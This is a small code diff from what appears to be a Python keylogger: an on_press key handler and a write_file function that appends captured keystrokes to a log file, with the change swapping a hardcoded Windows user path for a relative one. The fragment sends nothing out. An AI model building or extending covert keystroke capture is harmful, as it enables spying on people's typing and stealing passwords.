@@ -13,7 +13,7 @@ def on_press(key):
 
 def write_file(keys):
     global state
-    with open("C:\\Users\\chand\\Documents\\log.txt", "a") as f:
+    with open("log.txt", "a") as f:
         for key in keys:
             if state==0:
                 state=1
